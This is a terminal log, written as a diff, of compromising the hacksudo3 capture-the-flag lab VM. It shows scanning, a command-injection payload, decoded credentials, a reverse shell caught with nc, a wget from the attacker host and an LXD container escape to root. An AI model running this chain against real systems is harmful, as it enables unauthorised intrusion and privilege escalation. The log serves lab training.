@@ -1,0 +1,234 @@
+root@kali:~# nmap -A -p- 192.168.43.222
+Starting Nmap 7.91 ( https://nmap.org ) at 2021-04-15 20:40 CEST
+Nmap scan report for 192.168.43.222
+Host is up (0.00028s latency).
+Not shown: 65532 closed ports
+PORT   STATE    SERVICE VERSION
+21/tcp filtered ftp
+22/tcp filtered ssh
+80/tcp open     http    Apache httpd 2.4.46 ((Ubuntu))
+|_http-server-header: Apache/2.4.46 (Ubuntu)
+|_http-title: Link Lock - Password-protect links
+MAC Address: 08:00:27:E5:D3:FA (Oracle VirtualBox virtual NIC)
+Device type: general purpose
+Running: Linux 4.X|5.X
+OS CPE: cpe:/o:linux:linux_kernel:4 cpe:/o:linux:linux_kernel:5
+OS details: Linux 4.15 - 5.6
+Network Distance: 1 hop
+
+TRACEROUTE
+HOP RTT     ADDRESS
+1   0.28 ms 192.168.43.222
+
+OS and Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
+Nmap done: 1 IP address (1 host up) scanned in 12.89 seconds
+
+
+root@kali:~# gobuster dir -u 192.168.43.222 -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt -x txt,html,php,sql
+===============================================================
+Gobuster v3.1.0
+by OJ Reeves (@TheColonial) & Christian Mehlmauer (@firefart)
+===============================================================
+[+] Url:                     http://192.168.43.222
+[+] Method:                  GET
+[+] Threads:                 10
+[+] Wordlist:                /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt
+[+] Negative Status codes:   404
+[+] User Agent:              gobuster/3.1.0
+[+] Extensions:              sql,txt,html,php
+[+] Timeout:                 10s
+===============================================================
+2021/04/15 20:40:59 Starting gobuster in directory enumeration mode
+===============================================================
+/index.html           (Status: 200) [Size: 2270]
+/login.php            (Status: 200) [Size: 497] 
+/info.php             (Status: 200) [Size: 83324]
+/create               (Status: 301) [Size: 317] [--> http://192.168.43.222/create/]
+/LICENSE              (Status: 200) [Size: 1069]                                   
+/generator.php        (Status: 200) [Size: 647]                                    
+/hidden               (Status: 301) [Size: 317] [--> http://192.168.43.222/hidden/]
+/decrypt              (Status: 301) [Size: 318] [--> http://192.168.43.222/decrypt/]
+/server-status        (Status: 403) [Size: 279]                                     
+/bruteforce           (Status: 301) [Size: 321] [--> http://192.168.43.222/bruteforce/]
+                                                                                       
+===============================================================
+2021/04/15 20:47:29 Finished
+
+
+
+
+-->192.168.43.222/generator.php
+Command Injection
+&& cat /var/www/hacksudo
+
+unpxfhqb ybpxre FFU hfreanzr:unpxfhqb cnffjbeq:63p9142792q571q0s7p28ro30626q6s38792n2r7679o76q784231676q62447so80ns8953745s709p6622qqn2po4q754p262q0q31o3030n08s7o524079n6o336o
+
+ROT13-->
+hacksudo locker SSH username:hacksudo password:63c9142792d571d0f7c28eb30626d6f38792a2e7679b76d784231676d62447fb80af8953745f709c6622dda2cb4d754c262d0d31b3030a08f7b524079a6b336b
+
+pass--> vishal
+hacksudo:vishal
+
+
+Upload rv.php
+
+
+root@kali:~# nc -lvnp 4444
+listening on [any] 4444 ...
+connect to [192.168.43.254] from (UNKNOWN) [192.168.43.222] 51614
+Linux hacksudo 5.8.0-45-generic #51-Ubuntu SMP Fri Feb 19 13:24:51 UTC 2021 x86_64 x86_64 x86_64 GNU/Linux
+ 21:09:51 up 30 min,  1 user,  load average: 0.00, 0.09, 0.81
+USER     TTY      FROM             LOGIN@   IDLE   JCPU   PCPU WHAT
+hacksudo tty1     -                20:57    1:30   0.37s  0.32s -bash
+uid=33(www-data) gid=33(www-data) groups=33(www-data)
+/bin/sh: 0: can't access tty; job control turned off
+$ id
+uid=33(www-data) gid=33(www-data) groups=33(www-data)
+$ 
+$ 
+$ su hacksudo
+Password: vishal
+id
+uid=1000(hacksudo) gid=1000(hacksudo) groups=1000(hacksudo),4(adm),24(cdrom),30(dip),46(plugdev),116(lxd)
+python -c "import pty;pty.spawn('/bin/bash')"
+bash: line 2: python: command not found
+python3 -c "import pty;pty.spawn('/bin/bash')"
+hacksudo@hacksudo:/$ 
+
+hacksudo@hacksudo:/$ ls
+ls
+bin    dev   lib    libx32      mnt   root  snap      sys  var
+boot   etc   lib32  lost+found  opt   run   srv       tmp
+cdrom  home  lib64  media       proc  sbin  swap.img  usr
+hacksudo@hacksudo:/$ cd home
+hacksudo@hacksudo:/home$ cd hacksudo
+cd hacksudo
+hacksudo@hacksudo:~$ ls
+ls
+alpine.tar.gz  chat  locker  snap  storage  user.txt  view  work
+hacksudo@hacksudo:~$ ls -la
+ls -la
+total 6300
+drwxr-x--- 9 hacksudo hacksudo    4096 Apr 15 21:05 .
+drwxr-xr-x 3 root     root        4096 Mar 18 10:32 ..
+-rw-rw-r-- 1 hacksudo hacksudo 3253335 Apr 15 19:03 alpine.tar.gz
+-rw------- 1 hacksudo hacksudo     191 Mar 24 09:08 .bash_history
+-rw-r--r-- 1 hacksudo hacksudo     220 Jun 18  2020 .bash_logout
+-rw-r--r-- 1 hacksudo hacksudo    3771 Jun 18  2020 .bashrc
+drwx------ 2 hacksudo hacksudo    4096 Mar 18 10:35 .cache
+drwxrwxr-x 2 hacksudo hacksudo    4096 Mar 23 07:14 chat
+drwxrwxr-x 3 hacksudo hacksudo    4096 Mar 20 08:18 .local
+drwxrwxr-x 2 hacksudo hacksudo    4096 Mar 23 07:26 locker
+-rw-r--r-- 1 hacksudo hacksudo     807 Jun 18  2020 .profile
+drwxr-xr-x 3 hacksudo hacksudo    4096 Apr 15 21:05 snap
+drwxrwxr-x 2 hacksudo hacksudo    4096 Mar 23 07:12 storage
+-rw-r--r-- 1 hacksudo hacksudo       0 Mar 19 07:52 .sudo_as_admin_successful
+-rw------- 1 hacksudo hacksudo    4096 Mar 22 09:53 .swp
+-rw-rw---- 1 hacksudo hacksudo      33 Mar 20 11:46 user.txt
+-rwxr-xr-x 1 root     root     3126144 Mar 22 10:35 view
+-rw------- 1 hacksudo hacksudo     558 Apr 15 21:02 .viminfo
+drwxrwxr-x 2 hacksudo hacksudo    4096 Mar 23 07:24 work
+hacksudo@hacksudo:~$ 
+
+hacksudo@hacksudo:~$ 
+
+hacksudo@hacksudo:~$ 
+
+hacksudo@hacksudo:~$ wget 192.168.43.254/alpine-v3.13-x86_64-20210414_2246.tar.gz
+<168.43.254/alpine-v3.13-x86_64-20210414_2246.tar.gz
+--2021-04-15 21:11:31--  http://192.168.43.254/alpine-v3.13-x86_64-20210414_2246.tar.gz
+Connecting to 192.168.43.254:80... connected.
+HTTP request sent, awaiting response... 200 OK
+Length: 3253335 (3.1M) [application/gzip]
+Saving to: ‘alpine-v3.13-x86_64-20210414_2246.tar.gz’
+
+alpine-v3.13-x86_64 100%[===================>]   3.10M  --.-KB/s    in 0.03s   
+
+2021-04-15 21:11:31 (119 MB/s) - ‘alpine-v3.13-x86_64-20210414_2246.tar.gz’ saved [3253335/3253335]
+
+hacksudo@hacksudo:~$ lxc init myimage ignite -c security.privileged=true
+lxc init myimage ignite -c security.privileged=true
+Creating ignite
+Error: No storage pool found. Please create a new storage pool
+hacksudo@hacksudo:~$ lxd init
+lxd init
+Would you like to use LXD clustering? (yes/no) [default=no]: 
+
+Do you want to configure a new storage pool? (yes/no) [default=yes]: 
+
+
+
+Name of the new storage pool [default=default]: Name of the storage backend to use (btrfs, dir, lvm, ceph) [default=btrfs]: 
+
+Create a new BTRFS pool? (yes/no) [default=yes]: 
+
+Would you like to use an existing empty block device (e.g. a disk or partition)? (yes/no) [default=no]: 
+
+Size in GB of the new loop device (1GB minimum) [default=5GB]: 
+
+Would you like to connect to a MAAS server? (yes/no) [default=no]: 
+
+Would you like to create a new local network bridge? (yes/no) [default=yes]: 
+
+What should the new bridge be called? [default=lxdbr0]: 
+
+What IPv4 address should be used? (CIDR subnet notation, “auto” or “none”) [default=auto]: 
+
+What IPv6 address should be used? (CIDR subnet notation, “auto” or “none”) [default=auto]: 
+
+Would you like the LXD server to be available over the network? (yes/no) [default=no]: 
+
+Would you like stale cached images to be updated automatically? (yes/no) [default=yes] 
+
+Would you like a YAML "lxd init" preseed to be printed? (yes/no) [default=no]: 
+
+
+
+hacksudo@hacksudo:~$ 
+hacksudo@hacksudo:~$ lxc init myimage ignite -c security.privileged=true
+lxc init myimage ignite -c security.privileged=true
+Creating ignite
+hacksudo@hacksudo:~$ lxc config device add ignite mydevice disk source=/ path=/mnt/root recursive=true
+<ydevice disk source=/ path=/mnt/root recursive=true
+Device mydevice added to ignite
+hacksudo@hacksudo:~$ lxc start ignite
+lxc start ignite
+hacksudo@hacksudo:~$ lxc exec ignite /bin/sh
+lxc exec ignite /bin/sh
+~ # id      
+id
+uid=0(root) gid=0(root)
+~ # cd /mnt/root
+cd /mnt/root
+/mnt/root # ls       
+ls
+bin         home        lost+found  root        swap.img
+boot        lib         media       run         sys
+cdrom       lib32       mnt         sbin        tmp
+dev         lib64       opt         snap        usr
+etc         libx32      proc        srv         var
+/mnt/root # cd  root 
+cd  root
+/mnt/root/root # ls -la   
+ls -la
+total 48
+drwx------    5 root     root          4096 Mar 24 09:07 .
+drwxr-xr-x   20 root     root          4096 Mar 18 09:45 ..
+-rw-------    1 root     root          5579 Mar 24 09:08 .bash_history
+-rw-r--r--    1 root     root          3106 Aug 14  2019 .bashrc
+drwxr-xr-x    3 root     root          4096 Mar 19 08:01 .local
+-rw-r--r--    1 root     root           161 Sep 16  2020 .profile
+drwx------    2 root     root          4096 Mar 18 10:32 .ssh
+-rw-------    1 root     root           532 Mar 22 09:48 .viminfo
+-r--------    1 root     root            42 Mar 24 09:07 proof.txt
+-r--------    1 root     root            33 Mar 23 09:23 root.txt
+drwxr-xr-x    3 root     root          4096 Mar 18 10:33 snap
+/mnt/root/root # cat proof.txt
+cat proof.txt
+you successfully rooted hacksudo3 box !!!
+/mnt/root/root # cat root.txt
+cat root.txt
+7db64dc8077ff8f969938bc48bd0a9ab
+/mnt/root/root #    
+
+
